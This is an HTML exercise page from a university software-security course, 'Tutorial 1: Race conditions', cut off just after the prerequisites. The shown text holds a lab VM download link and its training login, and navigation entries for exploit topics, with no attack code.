
<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>Tutorial 1: Race conditions &#8212; Exercises 2022 documentation</title>
    <link rel="stylesheet" href="../_static/bootstrap-sphinx.css" type="text/css" />
    <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
    <link rel="stylesheet" href="../_static/css/my-style.css" type="text/css" />
    <script type="text/javascript" id="documentation_options" data-url_root="../" src="../_static/documentation_options.js"></script>
    <script type="text/javascript" src="../_static/jquery.js"></script>
    <script type="text/javascript" src="../_static/underscore.js"></script>
    <script type="text/javascript" src="../_static/doctools.js"></script>
    <script type="text/javascript" src="../_static/language_data.js"></script>
    <link rel="shortcut icon" href="../_static/favicon.ico"/>
    <link rel="index" title="Index" href="../genindex.html" />
    <link rel="search" title="Search" href="../search.html" />
    <link rel="next" title="Tutorial 2: Memory Safety" href="../tp2/tp.html" />
    <link rel="prev" title="Tutorial 0: Initiation" href="../tp0/tp.html" />

<meta charset='utf-8'>
<meta http-equiv='X-UA-Compatible' content='IE=edge,chrome=1'>
<meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1'>
<meta name="apple-mobile-web-app-capable" content="yes">
<script type="text/javascript" src="../_static/js/jquery-1.12.4.min.js "></script>
<script type="text/javascript" src="../_static/js/jquery-fix.js "></script>
<script type="text/javascript" src="../_static/bootstrap-3.4.1/js/bootstrap.min.js "></script>
<script type="text/javascript" src="../_static/bootstrap-sphinx.js "></script>

<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js"></script>
<script type="text/javascript" src="../_static/js/jquery-1.11.0.min.js "></script>
<script type="text/javascript" src="../_static/js/jquery-fix.js "></script>
<script type="text/javascript" src="../_static/script.js"></script>





  </head><body>

  <div id="navbar" class="navbar navbar-inverse navbar-default navbar-fixed-top">
    <div class="container">
      <div class="navbar-header">
        <!-- .btn-navbar is used as the toggle for collapsed navbar content -->
        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".nav-collapse">
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
        <a class="navbar-brand" href="../index.html"><span><img src="../_static/UCLouvain_Logo+moodle.png"></span>
          LINGI2144</a>
        <span class="navbar-text navbar-version pull-left"><b>2022</b></span>
      </div>

        <div class="collapse navbar-collapse nav-collapse">
          <ul class="nav navbar-nav">
            
                <li><a href="/index.html">Main</a></li>
                <li><a href="/theory/index.html">Theory</a></li>
                <li><a href="/qcm/index.html">MCQ</a></li>
            
            
              <li class="dropdown globaltoc-container">
  <a role="button"
     id="dLabelGlobalToc"
     data-toggle="dropdown"
     data-target="#"
     href="../index.html">Section <b class="caret"></b></a>
  <ul class="dropdown-menu globaltoc"
      role="menu"
      aria-labelledby="dLabelGlobalToc"><ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../tp0/tp.html">Tutorial 0: Initiation</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../tp0/tp.html#exercise">Exercise</a></li>
<li class="toctree-l2"><a class="reference internal" href="../tp0/tp.html#bonus-going-beyond">Bonus: going beyond</a></li>
</ul>
</li>
<li class="toctree-l1 current"><a class="current reference internal" href="#">Tutorial 1: Race conditions</a><ul>
<li class="toctree-l2"><a class="reference internal" href="#prerequisite">Prerequisite</a></li>
<li class="toctree-l2"><a class="reference internal" href="#exercise">Exercise</a></li>
<li class="toctree-l2"><a class="reference internal" href="#nfs-share-exploit-metasploit">NFS Share exploit - Metasploit</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../tp2/tp.html">Tutorial 2: Memory Safety</a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp3/tp.html">Tutorial 3: Debugging with <code class="docutils literal notranslate"><span class="pre">GDB</span></code></a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp4/tp.html">Tutorial 4: Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp5/tp.html">Tutorial 5: Buffer Overflows and Shellcodes</a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp6/tp.html">Tutorial 6: Protection</a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp7/tp.html">Tutorial 7: Format String</a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp8/tp.html">Tutorial 8: YARA</a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp9/tp.html">Tutorial 9: Dynamic Analysis</a></li>
</ul>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../extra/extra.html">Setting up the lab environment</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../extra/extra.html#download-a-vm-manager">Download a VM manager</a></li>
<li class="toctree-l2"><a class="reference internal" href="../extra/extra.html#grab-your-kali-linux-image">Grab your Kali Linux Image</a></li>
<li class="toctree-l2"><a class="reference internal" href="../extra/extra.html#bonus-make-yourself-at-home">Bonus : Make yourself at home !</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../extra/gdb.html">Tutorial: Complement on GDB</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../extra/gdb.html#introduction">Introduction</a></li>
<li class="toctree-l2"><a class="reference internal" href="../extra/gdb.html#exercise">Exercise</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../extra/handmadeshellcode.html">Tutorial:  Handmade Shellcode</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../extra/handmadeshellcode.html#introduction">Introduction</a></li>
<li class="toctree-l2"><a class="reference internal" href="../extra/handmadeshellcode.html#from-c-to-shellcode">From C to shellcode</a></li>
<li class="toctree-l2"><a class="reference internal" href="../extra/handmadeshellcode.html#removing-null-bytes">Removing Null bytes</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../extra/stackstethoscope.html">Tutorial:  ByPassing ASLR - Stack Stethoscope</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../extra/stackstethoscope.html#introduction">Introduction</a></li>
<li class="toctree-l2"><a class="reference internal" href="../extra/stackstethoscope.html#exercise">Exercise</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../extra/nfsshare2.html">Tutorial:  NFS Share exploit - Shellcode</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../extra/nfsshare2.html#prerequisite">Prerequisite</a></li>
<li class="toctree-l2"><a class="reference internal" href="../extra/nfsshare2.html#exercise">Exercise</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../extra/heapoverflow.html">Tutorial:  Heap overflow exploit - Function pointers</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../extra/heapoverflow.html#introduction">Introduction</a></li>
<li class="toctree-l2"><a class="reference internal" href="../extra/heapoverflow.html#exercise">Exercise</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../extra/heapoverflow2.html">Tutorial:  Heap overflow exploit - Abusing the file system</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../extra/heapoverflow2.html#introduction">Introduction</a></li>
<li class="toctree-l2"><a class="reference internal" href="../extra/heapoverflow2.html#exercise">Exercise</a></li>
<li class="toctree-l2"><a class="reference internal" href="../extra/heapoverflow2.html#gaining-root-access">Gaining root access</a></li>
<li class="toctree-l2"><a class="reference internal" href="../extra/heapoverflow2.html#bonus">BONUS</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../extra/en-var.html">Tutorial: Exploit using the Environment</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../extra/en-var.html#requirements">Requirements</a></li>
<li class="toctree-l2"><a class="reference internal" href="../extra/en-var.html#adding-environment-variable">Adding environment variable</a></li>
<li class="toctree-l2"><a class="reference internal" href="../extra/en-var.html#go-even-further">Go even further</a></li>
</ul>
</li>
</ul>
</ul>
</li>
              
            
            
            
            
            
          </ul>

          
            
<form class="navbar-form navbar-right" action="../search.html" method="get">
 <div class="form-group">
  <input type="text" name="q" class="form-control" placeholder="Search" />
 </div>
  <input type="hidden" name="check_keywords" value="yes" />
  <input type="hidden" name="area" value="default" />
</form>
          
        </div>
    </div>
  </div>

<div class="container" >
  <div class="row">
      <div class="col-md-3">
        <div id="sidebar" class="bs-sidenav" role="complementary">
<form action="../search.html" method="get">
 <div class="form-group">
  <input type="text" name="q" class="form-control" placeholder="Search" />
 </div>
  <input type="hidden" name="check_keywords" value="yes" />
  <input type="hidden" name="area" value="default" />
</form><ul>
<li><a class="reference internal" href="#">Tutorial 1: Race conditions</a><ul>
<li><a class="reference internal" href="#prerequisite">Prerequisite</a></li>
<li><a class="reference internal" href="#exercise">Exercise</a><ul>
<li><a class="reference internal" href="#using-system-setuid-from-lecture">Using <code class="docutils literal notranslate"><span class="pre">system()</span></code> &amp; <code class="docutils literal notranslate"><span class="pre">SETUID</span></code> (from lecture)</a></li>
<li><a class="reference internal" href="#spam-delay">Spam &amp; Delay</a></li>
<li><a class="reference internal" href="#execve-exploit"><code class="docutils literal notranslate"><span class="pre">execve</span></code> exploit</a></li>
<li><a class="reference internal" href="#integer-overflows">Integer Overflows</a></li>
<li><a class="reference internal" href="#race-conditions">Race Conditions</a></li>
<li><a class="reference internal" href="#thread-race-conditions-from-lecture">Thread Race Conditions (from lecture)</a></li>
<li><a class="reference internal" href="#a-bad-cron-task">A bad cron task</a></li>
<li><a class="reference internal" href="#finding-a-target">Finding a Target</a></li>
</ul>
</li>
<li><a class="reference internal" href="#nfs-share-exploit-metasploit">NFS Share exploit - Metasploit</a><ul>
<li><a class="reference internal" href="#introduction">Introduction</a></li>
<li><a class="reference internal" href="#setup">Setup</a></li>
<li><a class="reference internal" href="#exploit">Exploit</a></li>
<li><a class="reference internal" href="#backdoor">Backdoor</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<div class="row autorization" style="padding-top: 20px">
    <div class="col-xs-4 col-md-6">
        <form id="pdf_tp" target="_blank" style="text-align:center;" method="get" action="">
            <button style="text-align:center; border-radius:12px;" type="submit" class="up">
                <svg id="Capa_1"
                     width="50px" height="50px"
                     enable-background="new 0 0 512 512" height="512" viewBox="0 0 512 512" width="512" xmlns="http://www.w3.org/2000/svg"><g><g><path d="m393.5 151.547v263.953c0 22.091-17.909 40-40 40h-275c-22.091 0-40-17.909-40-40v-368c0-22.091 17.909-40 40-40h171.197c7.968 0 15.608 3.17 21.236 8.809l113.803 114.047c5.612 5.625 8.764 13.246 8.764 21.191z" fill="#f9f8f9"/><path d="m393.5 151.55v17.59h-104.32c-31.45 0-57.04-25.62-57.04-57.1v-104.54h17.56c7.96 0 15.6 3.17 21.23 8.81l113.81 114.05c5.61 5.62 8.76 13.24 8.76 21.19z" fill="#e3e0e4"/><path d="m108.5 455.5h-30c-22.09 0-40-17.91-40-40v-368c0-22.09 17.91-40 40-40h30c-22.09 0-40 17.91-40 40v368c0 22.09 17.91 40 40 40z" fill="#e3e0e4"/><g fill="#a29aa5"><path d="m219.608 157.5h-123.7c-4.142 0-7.5-3.358-7.5-7.5s3.358-7.5 7.5-7.5h123.7c4.142 0 7.5 3.358 7.5 7.5s-3.358 7.5-7.5 7.5z"/><path d="m219.608 337.5h-123.7c-4.142 0-7.5-3.358-7.5-7.5s3.358-7.5 7.5-7.5h123.7c4.142 0 7.5 3.358 7.5 7.5s-3.358 7.5-7.5 7.5z"/><path d="m317.908 217.5h-224c-4.142 0-7.5-3.358-7.5-7.5s3.358-7.5 7.5-7.5h224c4.142 0 7.5 3.358 7.5 7.5s-3.358 7.5-7.5 7.5z"/><path d="m317.908 277.5h-224c-4.142 0-7.5-3.358-7.5-7.5s3.358-7.5 7.5-7.5h224c4.142 0 7.5 3.358 7.5 7.5s-3.358 7.5-7.5 7.5z"/><path d="m390.81 139.14h-101.63c-14.93 0-27.04-12.14-27.04-27.1v-101.82c3.24 1.46 6.23 3.52 8.79 6.09l113.81 114.05c2.55 2.56 4.61 5.54 6.07 8.78z"/></g><ellipse cx="371.989" cy="403" fill="#80e29e" rx="101.511" ry="101.5"/><path d="m453.07 464.07c-18.52 24.56-47.95 40.43-81.08 40.43-56.06 0-101.51-45.44-101.51-101.5 0-33.13 15.87-62.55 40.43-81.07-12.83 16.99-20.43 38.14-20.43 61.07 0 56.06 45.45 101.5 101.51 101.5 22.93 0 44.08-7.6 61.08-20.43z" fill="#77d192"/><path d="m423.124 410.243c-4.008-7.25-13.135-9.881-20.386-5.873l-15.747 8.701v-45.572c0-8.284-6.717-15-15.002-15s-15.002 6.716-15.002 15v45.573l-15.747-8.701c-7.252-4.007-16.378-1.377-20.386 5.873-4.007 7.251-1.377 16.377 5.875 20.384l38.004 21c.091.05.184.093.275.141.139.073.278.146.419.214.167.082.336.158.505.232.125.055.25.111.377.163.198.081.398.156.598.228.099.036.197.073.297.107.24.081.481.153.723.222.064.018.127.038.191.055.287.077.576.144.865.204.023.005.046.011.069.015.971.194 1.95.294 2.924.294l-.001-.003h.015c2.497 0 4.997-.623 7.256-1.872l38.004-21c7.251-4.008 9.881-13.134 5.874-20.385z" fill="#f9f8f9"/></g><g><path d="m38.5 129.5c4.143 0 7.5-3.358 7.5-7.5v-74.5c0-17.92 14.581-32.5 32.504-32.5h171.215c1.687 0 3.339.203 4.946.562v96.474c0 19.08 15.497 34.603 34.546 34.603h96.274c.354 1.595.553 3.235.553 4.908v40.453c0 4.142 3.357 7.5 7.5 7.5s7.5-3.358 7.5-7.5v-40.453c0-10.002-3.892-19.409-10.957-26.488l-113.815-114.047c-7.087-7.101-16.515-11.012-26.547-11.012h-171.215c-26.193 0-47.504 21.309-47.504 47.5v74.5c0 4.142 3.357 7.5 7.5 7.5zm336.956 2.139h-86.245c-10.777 0-19.546-8.793-19.546-19.603v-86.404z"/><path d="m171 448h-92.496c-17.923 0-32.504-14.58-32.504-32.5v-258.5c0-4.142-3.357-7.5-7.5-7.5s-7.5 3.358-7.5 7.5v258.5c0 26.191 21.311 47.5 47.504 47.5h92.496c4.143 0 7.5-3.358 7.5-7.5s-3.357-7.5-7.5-7.5z"/><path d="m95.914 157.5h123.713c4.143 0 7.5-3.358 7.5-7.5s-3.357-7.5-7.5-7.5h-123.713c-4.143 0-7.5 3.358-7.5 7.5s3.357 7.5 7.5 7.5z"/><path d="m95.914 322.5c-4.143 0-7.5 3.358-7.5 7.5s3.357 7.5 7.5 7.5h123.713c4.143 0 7.5-3.358 7.5-7.5s-3.357-7.5-7.5-7.5z"/><path d="m317.938 202.5h-224.025c-4.143 0-7.5 3.358-7.5 7.5s3.357 7.5 7.5 7.5h224.024c4.143 0 7.5-3.358 7.5-7.5s-3.357-7.5-7.499-7.5z"/><path d="m325.438 270c0-4.142-3.357-7.5-7.5-7.5h-224.025c-4.143 0-7.5 3.358-7.5 7.5s3.357 7.5 7.5 7.5h224.024c4.143 0 7.501-3.358 7.501-7.5z"/><path d="m401.038 297.936v-70.936c0-4.142-3.357-7.5-7.5-7.5s-7.5 3.358-7.5 7.5v67.903c-4.6-.594-9.289-.903-14.049-.903-34.387 0-66.05 15.725-86.87 43.142-2.506 3.299-1.862 8.003 1.437 10.509 3.301 2.506 8.005 1.861 10.509-1.438 17.959-23.649 45.268-37.213 74.924-37.213 6.868 0 13.564.747 20.017 2.152.011.002.021.005.032.007 42.237 9.211 73.962 46.888 73.962 91.841 0 51.832-42.173 94-94.011 94s-94.011-42.168-94.011-94c0-9.542 1.423-18.95 4.229-27.965 1.231-3.955-.978-8.159-4.933-9.39-3.956-1.23-8.159.978-9.39 4.932-3.256 10.459-4.906 21.368-4.906 32.423 0 16.037 3.484 31.275 9.731 45h-66.709c-4.143 0-7.5 3.358-7.5 7.5s3.357 7.5 7.5 7.5h75.028c19.528 29.501 53.008 49 90.961 49 60.109 0 109.011-48.897 109.011-109 0-50.048-33.911-92.319-79.962-105.064z"/><path d="m371.989 344.999c-12.407 0-22.502 10.093-22.502 22.5v32.859l-4.619-2.552c-10.857-6.001-24.574-2.048-30.578 8.81-2.907 5.26-3.591 11.338-1.927 17.113s5.479 10.556 10.739 13.463l38.003 21c6.646 3.71 15.127 3.734 21.767 0l38.004-21c5.261-2.907 9.075-7.688 10.739-13.463s.98-11.853-1.928-17.115c-6.003-10.857-19.721-14.81-30.577-8.808l-4.619 2.552v-32.859c0-12.407-10.095-22.5-22.502-22.5zm34.376 65.935c3.617-1.999 8.192-.682 10.194 2.937 2.023 3.489.632 8.315-2.938 10.192l-38.006 21.001c-2.328 1.295-5.291 1.189-7.563-.171l-37.696-20.83c-3.569-1.876-4.96-6.703-2.938-10.19 2.003-3.621 6.577-4.938 10.195-2.938l15.746 8.701c4.749 2.823 11.296-1.04 11.128-6.564v-45.573c0-4.136 3.365-7.5 7.502-7.5s7.502 3.364 7.502 7.5v45.572c-.17 5.534 6.367 9.39 11.127 6.564z"/></g></g>
                </svg>
                <br> <b> PDF </b>
            </button>
        </form>
    </div>
    <div class="col-xs-4 col-md-6">
        <form id="rar_tp"  target="_blank" style="text-align:center;" method="get" action="">
            <button style="text-align:center; border-radius:12px;" type="submit" class="up">
                <svg id="Capa_1"
                     width="50px" height="50px"
                     enable-background="new 0 0 512 512" height="512" viewBox="0 0 512 512" width="512" xmlns="http://www.w3.org/2000/svg"><g><g><path d="m453.31 460.125c0 24.508-19.907 44.375-44.464 44.375h-305.692c-24.557 0-44.464-19.867-44.464-44.375v-408.25c0-24.508 19.907-44.375 44.464-44.375h190.303c8.857 0 17.35 3.516 23.606 9.773l126.505 126.521c6.239 6.239 9.742 14.694 9.742 23.508z" fill="#f9f8f9"/><path d="m133.15 504.5h-30c-24.55 0-44.46-19.87-44.46-44.38v-408.24c0-24.51 19.91-44.38 44.46-44.38h30c-24.55 0-44.46 19.87-44.46 44.38v408.24c0 24.51 19.91 44.38 44.46 44.38z" fill="#e3e0e4"/><path d="m453.31 167.3v16.24h-115.96c-33.12 0-60.06-26.95-60.06-60.07v-115.97h16.17c8.85 0 17.35 3.52 23.6 9.77l126.51 126.52c6.24 6.24 9.74 14.7 9.74 23.51z" fill="#e3e0e4"/><path d="m450.32 153.54h-112.97c-16.6 0-30.06-13.46-30.06-30.07v-112.96c3.61 1.63 6.92 3.91 9.77 6.76l126.51 126.52c2.85 2.85 5.12 6.15 6.75 9.75z" fill="#b9a1d3"/><path d="m435 438.5h-358c-22.091 0-40-17.909-40-40v-146c0-22.091 17.909-40 40-40h358c22.091 0 40 17.909 40 40v146c0 22.091-17.909 40-40 40z" fill="#b9a1d3"/><path d="m102 438.5h-25c-22.09 0-40-17.91-40-40v-146c0-22.09 17.91-40 40-40h25c-22.09 0-40 17.91-40 40v146c0 22.09 17.91 40 40 40z" fill="#9573bb"/></g><g><path d="m58.689 153.851c4.143 0 7.5-3.357 7.5-7.5v-94.476c0-20.333 16.582-36.875 36.965-36.875h111.42c4.143 0 7.5-3.357 7.5-7.5s-3.357-7.5-7.5-7.5h-111.42c-28.653 0-51.965 23.271-51.965 51.875v94.476c0 4.142 3.358 7.5 7.5 7.5z"/><path d="m460.811 212.656v-45.354c0-10.879-4.24-21.111-11.938-28.811l-126.506-126.52c-7.718-7.72-17.985-11.971-28.91-11.971h-43.394c-4.143 0-7.5 3.357-7.5 7.5s3.357 7.5 7.5 7.5h43.394c2.165 0 4.288.264 6.334.775v107.696c0 20.714 16.85 37.566 37.561 37.566h107.694c.505 2.025.765 4.125.765 6.265v38.954c-3.476-.812-7.092-1.256-10.811-1.256h-23.319c-4.143 0-7.5 3.357-7.5 7.5s3.357 7.5 7.5 7.5h23.319c17.921 0 32.5 14.579 32.5 32.5v146c0 17.921-14.579 32.5-32.5 32.5h-268.66c-4.143 0-7.5 3.357-7.5 7.5s3.357 7.5 7.5 7.5h268.66c3.719 0 7.335-.444 10.811-1.256v15.381c0 20.333-16.582 36.875-36.965 36.875h-305.692c-20.383 0-36.965-16.542-36.965-36.875v-15.381c3.476.812 7.092 1.256 10.811 1.256h53.319c4.143 0 7.5-3.357 7.5-7.5s-3.357-7.5-7.5-7.5h-53.319c-17.921 0-32.5-14.579-32.5-32.5v-146c0-17.921 14.579-32.5 32.5-32.5h299.702c4.143 0 7.5-3.357 7.5-7.5s-3.357-7.5-7.5-7.5h-299.702c-3.719 0-7.335.444-10.811 1.256v-24.905c0-4.143-3.357-7.5-7.5-7.5s-7.5 3.357-7.5 7.5v31.305c-13.04 8.477-21.689 23.165-21.689 39.844v146c0 16.679 8.649 31.367 21.689 39.844v21.781c0 28.604 23.312 51.875 51.965 51.875h305.691c28.653 0 51.965-23.271 51.965-51.875v-21.781c13.041-8.477 21.689-23.165 21.689-39.844v-146c.001-16.679-8.648-31.367-21.688-39.844zm-146.02-89.185v-97.863l120.414 120.429h-97.854c-12.439 0-22.56-10.123-22.56-22.566z"/><path d="m265.669 264.091c-1.584-3.853-5.297-6.341-9.462-6.341-.003 0-.006 0-.009 0-4.168.004-7.882 2.499-9.461 6.356-.023.057-.046.114-.067.172l-45.247 118.803c-1.475 3.87.469 8.203 4.34 9.678 3.865 1.475 8.203-.468 9.678-4.34l9.429-24.757h62.347l9.335 24.736c1.458 3.914 5.891 5.823 9.665 4.368 3.875-1.462 5.831-5.789 4.368-9.665l-44.836-118.808c-.025-.067-.053-.135-.08-.202zm-35.087 84.571 25.603-67.226 25.37 67.226z"/><path d="m181.648 296.566c0-21.403-18.208-38.816-40.589-38.816h-32.021c-.007 0-.013.001-.02.001-.006 0-.013-.001-.019-.001-4.143 0-7.5 3.357-7.5 7.5v120.5c0 4.143 3.357 7.5 7.5 7.5s7.5-3.357 7.5-7.5v-50.27c1.064-.006 2.204-.012 3.398-.018l48.62 55.243c2.745 3.118 7.488 3.403 10.585.675 3.109-2.736 3.411-7.476.675-10.585l-39.967-45.411c.438 0 .862-.001 1.249-.001 22.381 0 40.589-17.413 40.589-38.817zm-40.588-23.816c13.87 0 25.589 10.906 25.589 23.816s-11.719 23.816-25.589 23.816c-5.593 0-16.825.056-24.342.096-.042-7.433-.099-18.474-.099-23.912 0-4.577-.032-16.093-.057-23.816z"/><path d="m410.5 296.566c0-21.403-18.208-38.816-40.589-38.816h-32.021c-.007 0-.013.001-.02.001-.006 0-.013-.001-.019-.001-4.143 0-7.5 3.357-7.5 7.5v120.5c0 4.143 3.357 7.5 7.5 7.5s7.5-3.357 7.5-7.5v-50.27c1.064-.006 2.204-.012 3.398-.018l48.62 55.243c2.745 3.118 7.488 3.403 10.585.675 3.109-2.736 3.411-7.476.675-10.585l-39.967-45.411c.438 0 .862-.001 1.249-.001 22.381 0 40.589-17.413 40.589-38.817zm-40.589-23.816c13.87 0 25.589 10.906 25.589 23.816s-11.719 23.816-25.589 23.816c-5.593 0-16.825.056-24.342.096-.042-7.433-.099-18.474-.099-23.912 0-4.577-.032-16.093-.057-23.816z"/></g></g>
                </svg>
                <br> <b> Files </b>
            </button>
        </form>
    </div>
    <div class="col-xs-4 col-md-12">
        <form id="vid_tp" style="text-align:center;">
	<a id="notUp"  href="#!" style="text-align:center;"
   data-title="Watch now on youtube">
            <button class="video-btn up" onclick="topFunction()"
                    style="text-align:center; border-radius:12px;" data-toggle="modal" type="button"
                    data-target="#myModal"
                    data-src="">
                <?xml version="1.0" encoding="iso-8859-1"?>
<!-- Generator: Adobe Illustrator 19.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<svg width="50px" height="50px" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 viewBox="0 0 512.003 512.003" style="enable-background:new 0 0 512.003 512.003;" xml:space="preserve">
<path style="fill:#E53935;" d="M443.734,80.336L330.86,70.437c-49.812-4.334-99.906-4.334-149.717,0L68.268,80.336
	c-38.702,3.124-68.459,35.541-68.267,74.368v202.667c-0.204,38.835,29.557,71.265,68.267,74.389l112.939,9.813
	c24.832,2.133,49.835,3.243,74.859,3.243c25.024,0,50.027-1.067,74.859-3.243l112.939-9.813c38.659-3.187,68.348-35.6,68.139-74.389
	V154.704C512.194,115.877,482.436,83.459,443.734,80.336z"/>
<path style="fill:#FAFAFA;" d="M357.782,247.077l-149.333-96c-4.951-3.193-11.552-1.768-14.745,3.183
	c-1.111,1.722-1.702,3.728-1.703,5.777v192c0.002,5.891,4.78,10.665,10.671,10.663c2.049-0.001,4.055-0.592,5.777-1.703l149.333-96
	c4.954-3.187,6.387-9.787,3.2-14.742c-0.825-1.283-1.917-2.374-3.2-3.2V247.077z"/>
<path d="M256.001,444.816c-25.003,0-50.005-1.088-74.837-3.243l-112.896-9.835c-38.71-3.124-68.471-35.554-68.267-74.389V154.683
	c-0.182-38.819,29.573-71.224,68.267-74.347l112.896-9.899c49.797-4.334,99.877-4.334,149.675,0l112.96,9.813
	c38.717,3.158,68.454,35.629,68.203,74.475v202.667c0.204,38.835-29.557,71.265-68.267,74.389l0,0l-112.96,9.813
	C306.028,443.771,281.004,444.816,256.001,444.816z M256.001,88.549c-24.405,0-48.768,1.067-72.981,3.157L69.953,101.52
	c-27.614,2.317-48.794,25.495-48.619,53.205v202.667c-0.116,27.7,21.097,50.827,48.704,53.099l112.96,9.813
	c48.57,4.209,97.414,4.209,145.984,0l113.067-9.813c27.589-2.315,48.76-25.456,48.619-53.141V154.683
	c0.116-27.7-21.097-50.827-48.704-53.099l-112.96-9.813c-24.235-2.105-48.569-3.164-73.003-3.179V88.549z"/>
<path d="M202.668,362.704c-5.891,0-10.667-4.776-10.667-10.667v-192c-0.01-5.891,4.758-10.674,10.649-10.684
	c2.057-0.003,4.07,0.588,5.799,1.703l149.333,96c4.96,3.178,6.405,9.776,3.227,14.736c-0.83,1.296-1.931,2.397-3.227,3.227
	l-149.333,96C206.724,362.124,204.717,362.709,202.668,362.704z M213.334,179.579v152.917l118.933-76.459L213.334,179.579z"/>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
</svg>

                <br> <b>  Video </b>
            </button>
        </a>
</form>

  <!-- Modal -->
  <!-- Modal -->
  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel"
    aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">

        <div class="modal-body">

          <button type="button" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
          <!-- 16:9 aspect ratio -->
          <div id="video-view" class="embed-responsive embed-responsive-16by9">

          </div>
        </div>
      </div>
    </div>
  </div>
    </div>
</div>
        </div>
      </div>
    <div class="body col-md-9 content" role="main" >
      
  <div class="section" id="tutorial-1-race-conditions">
<h1>Tutorial 1: Race conditions<a class="headerlink" href="#tutorial-1-race-conditions" title="Permalink to this headline">¶</a></h1>
<?php
      //$path = $_SERVER['DOCUMENT_ROOT'];
      //echo $path;
      $json   = "../../_static/config.json";
      //echo $json . "<br>";
      $string = file_get_contents($json);
      if ($string === false) {
         //deal error
         echo "error json";
      }
      //echo $string;
      $decoded = json_decode($string, true);
      if ($decoded === null) {
         echo "error json decoded";
      }
      $visi = (strcmp($decoded["t1"],"1") === 0);
      if($visi) {
         header("location: index.php");
         echo '<script type="text/javascript">',
                  'hideFiles();',
               '</script>';
         echo "<br><h3 style='text-align: center;'> Still not accessible :/ </h3>";
         exit; // prevent further execution, should there be more code that follows
      }
?>
<?php
      $good = (strcmp($decoded["t1s"],"1") === 0);
      if($good) {
         //nothing
         echo '<script type="text/javascript">',
                  'hideSolution();',
               '</script>';
      } else {
         echo '<script type="text/javascript">',
                  //'$(document).ready(function() { $(".sol-img").toggle(); });',
               '</script>';
      }
?><div class="section" id="prerequisite">
<h2>Prerequisite<a class="headerlink" href="#prerequisite" title="Permalink to this headline">¶</a></h2>
<p>Download the Kali VM from this link</p>
<p class="centered">
<strong><a class="reference external" href="https://transvol.sgsi.ucl.ac.be/download.php?id=bf224c2c94622b90">https://transvol.sgsi.ucl.ac.be/download.php?id=bf224c2c94622b90</a> (+- 3 Go)</strong></p><div class="line-block">
<div class="line">Working directory: <code class="docutils literal notranslate"><span class="pre">~/SecurityClass/Tutorial-01</span></code></div>
<div class="line">Connection:</div>
</div>
<table border="1" class="docutils">
<colgroup>
<col width="50%" />
<col width="50%" />
</colgroup>
<thead valign="bottom">
<tr class="row-odd"><th class="head"><strong>username</strong></th>
<th class="head"><strong>password</strong></th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td>admin</td>
<td>nimda</td>
</tr>
</tbody>
</table>
<div class="line-block">
<div class="line">Note that the admin user has <code class="docutils literal notranslate"><span class="pre">sudo</span></code> privileges and so can do
anything on the system. Also that the admin user does not need to
provide their password to invoke <code class="docutils literal notranslate"><span class="pre">sudo</span></code>.</div>
</div>
<div class="line-block">
<div class="line">Also note that each subsection of the tutorial has it’s own
sub-directory with the appropriate files.</div>
</div>
</div>
<div class="section" id="exercise">
<h2>Exercise<a class="headerlink" href="#exercise" title="Permalink to this headline">¶</a></h2>
<div class="section" id="using-system-setuid-from-lecture">
<h3>Using <code class="docutils literal notranslate"><span class="pre">system()</span></code> &amp; <code class="docutils literal notranslate"><span class="pre">SETUID</span></code> (from lecture)<a class="headerlink" href="#using-system-setuid-from-lecture" title="Permalink to this headline">¶</a></h3>
<p>Compile the <code class="docutils literal notranslate"><span class="pre">test.c</span></code> file with:</p>
<p class="centered">
